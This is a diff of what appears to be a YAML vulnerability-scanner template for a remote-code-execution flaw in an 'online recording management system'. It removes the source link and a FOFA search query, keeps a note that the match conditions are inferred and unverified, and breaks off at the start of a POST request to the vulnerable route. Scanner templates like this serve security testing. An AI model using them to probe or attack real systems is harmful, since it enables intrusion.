@@ -3,14 +3,8 @@ info:
   name: 在线录音管理系统index RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xw70c08b5d0bifl5
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xw70c08b5d0bifl5
-    fofa: title="在线录音管理系统"
 http:
 - raw:
   - 'POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
